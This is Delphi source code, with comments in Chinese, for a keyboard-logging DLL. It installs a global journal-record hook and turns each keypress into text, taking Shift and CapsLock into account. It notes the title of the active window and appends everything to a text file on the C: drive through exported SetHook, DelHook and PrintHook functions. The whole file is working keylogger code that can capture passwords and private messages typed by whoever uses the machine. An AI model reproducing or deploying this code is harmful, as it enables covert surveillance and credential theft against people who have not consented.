library KeyboardHook;

uses
  SysUtils,
  Windows,
  Messages,
  Classes;

{$R *.res}

var
  hook: HHOOK; {钩子变量}
  LastFocusWnd:Hwnd=0;
  PrvChar:Char;
  HookKey:String;

  KeyList:Tstringlist;

const
  KeyMask=$80000000;

{键盘钩子函数}
function KeyboardHookProc(iCode: Integer; wParam: WPARAM; lParam:LPARAM):LRESULT;stdcall;
var
    ch:Char;           //记录一个个按下的按键字符
    vKey:integer;      //表示按下了哪个键
    FocusWnd:HWND;     //当前活动窗口句柄
    Title:array[0..255] of char;    //窗口句柄的标题
    str:array[0..12] of char;       // 当8<=vkey<=46时，表示按下的键名，例如[退格]
    PEvt:^EventMsg;         //EventMsg的指针
    iCapsLock,iNumLock,iShift:integer; //状态按键
    bCapsLock,bNumLock,bShift:boolean; //是否按下状态按键
begin
  if iCode<0 then //遵照SDK文档
  begin
    Result:=CallNextHookEx(hook,iCode,wParam,lParam);
    Exit;
  end;

  if (iCode = HC_ACTION) then                   //设备动作
  begin

    PEvt := pointer(Dword(lparam));           //将lparam的指针传递给PEvt事件消息指针
    FocusWnd:= GetActiveWindow;               //获取活动窗体句柄
    if (LastFocusWnd <> FocusWnd) then
    begin
        if (HookKey <> '') then
        begin
              KeyList.Add('键盘击打：'+HookKey);
              HookKey:= '';
        end;
        GetWindowText(FocusWnd,Title,256);
        LastFocusWnd:= FocusWnd;
        KeyList.add(Format('激活窗口：%s',[Title]));
    end;

    if (PEvt.message = WM_KEYDOWN) then       //如果事件消息为键下压操作
    begin
        vkey := LoByte(PEvt.paramL );         //取得16进制数最低位那个字节的内容
        iShift:= GetKeyState(VK_SHIFT);       //获取这三个键的状态
        iCapsLock:= GetKeyState(VK_CAPITAL);
        iNumLock:= GEtKeyState(VK_NUMLOCK);
        bShift:= ((iShift and KeyMask) = KeyMask); //判断它们的状态
        bCapsLock:=(iCapsLock = 1);
        bNumLock:= (iNumLock = 1);
    end;

    if ((vKey >= 48) and (vKey <=57)) then       //      0<=char(vkey)<=9
    begin
        if (not bShift) then                     //如果没有按下Shift键
            ch:= char (vkey)                     //数字字符
        else
        begin
            case vkey of                         //否则为以下字符之一
                48:ch:= ')';
                49:ch:= '!';
                50:ch:= '@';
                51:ch:= '#';
                52:ch:= '$';
                53:ch:= '%';
                54:ch:= '^';
                55:ch:= '&';
                56:ch:= '*';
                57:ch:= '(';
            end; //end case
        end;    //end else
        HookKey:= HookKey + ch;
    end;        //end if ((vKey >= 48) and (vKey <=57))

    if ((vKey >=65) and (vKey <= 90)) then   // 'A'<=char(vkey)<='Z'
    begin
         if (not bCapsLock) then            //如果没有按下CapsLock键
         begin
            if (bShift) then                //按下了Shift键
              ch:= char(vkey)               //大写
            else
              ch:= char(vkey + 32);         //小写
         end
         else                              //按下了CapsLock键
         begin
             if (bShift) then              //按下了Shift键
               ch:= char(vkey + 32)        //小写
             else
               ch:= char(vkey);            //大写
         end;
         HookKey:= HookKey + ch;           //将按键添加到按键字符串
    end;
    if ((vkey >= 96) and (vkey <= 105)) then      //小键盘的0-9
        if bNumLock then
          HookKey:= HookKey + char(vkey - 96 + 48);
    ch:= 'n';
    if ((vkey >= 105) and (vkey <=111)) then     //+-*/
    begin
        case vkey of
            106:ch:= '*';
            107:ch:= '+';
            109:ch:= '-';
            111:ch:= '/';
        else
            ch:= 'n';
        end;
    end;
    if ((vkey >=186) and (vkey <= 222)) then        //特殊符号
    begin
        if (not bShift) then            //没有按下Shift键
        begin
            case vkey of
                186:ch:= ';';
                187:ch:= '=';
                189:ch:= ',';
                190:ch:= '.';
                191:ch:= '/';
                192:ch:= '''' ;
                219:ch:= '[';
                220:ch:= '\';
                221:ch:= ']';
                222:ch:=char(27);
            else
                ch:= 'n';
            end; //end case
        end
        else
        begin
             case vkey of
                186:ch:= ':';
                187:ch:= '+';
                189:ch:= '<';
                190:ch:= '>';
                191:ch:= '?';
                192:ch:= '~';
                219:ch:= '{';
                220:ch:= '|';
                221:ch:= '}';
                222:ch:= '"';
             else
                ch:= 'n';
             end;   //end case
        end;     //end if else
    end;        //end if ((vkey >=186) and (vkey <= 222))
    if ch <> 'n' then              //剔除未规定字符
        HookKey := HookKey + ch;
    if ((vkey >= 8) and (vkey <=46)) then
    begin
        ch:= ' ';
        case vkey of
            8:str:= '[BACK]';
            9:str:= '[TAB]';
            13:str:= '[ENTER]';
            32:str:= '[SPACE]';
            35:str:= '[END]';
            36:str:= '[HOME]';
            37:str:= '[LF]';
            38:str:= '[UF]';
            39:str:= '[RF]';
            40:str:= '[DF]';
            45:str:= '[INSERT]';
            46:str:= '[DELETE]';
        else
            ch:= 'n';
        end;
        if (ch <> 'n') then
        begin
            HookKey := HookKey + str;
        end;
    end;

   // KeyList.Add('ABC');
  end;//end iCode= HC_ACTION

  result := CallNextHookEx(hook,iCode,wparam,lparam);
end;

{建立钩子}
function SetHook:Boolean;stdcall;
begin
  if (hook = 0) then
  begin
    KeyList:=Tstringlist.Create;
    hook := SetWindowsHookEx(WH_JOURNALRECORD,KeyboardHookProc,HInstance,0);    //调用API HOOK
    Result:=hook<>0
  end
  else
    Result:=False;
end;

{释放钩子}
function DelHook:Boolean;stdcall;
begin
  if (hook <> 0 ) then
  begin
      Result:=UnHookWindowsHookEx(hook);    //卸载HOOK
      hook:=0;
      KeyList.Free;
  end
  else
      Result:=False;
end;

procedure PrintHook;stdcall;
var
  printStr:string;
  txtFile:TextFile;
  fileName:string;
begin
 if KeyList <> nil then
  begin
    printStr:=keyList.Text;
    KeyList.Text:='';
    //将键盘输入内容进行打印
    fileName:='C:\keyboardRecord.txt';

    AssignFile(txtFile,fileName);
    if not FileExists(fileName) then
    begin
      Rewrite(txtFile);
    end
    else
    begin
      Append(txtFile);
    end;

    Writeln(txtFile,printStr);
    Closefile(txtFile);

  end;
end;

{按DLL的要求输出函数}
exports
SetHook name 'SetHook',
DelHook name 'DelHook',
PrintHook name 'PrintHook';

//SetHook,DelHook,PrintHook;{如果不需要改名,可以直接这样exports}
begin
end.
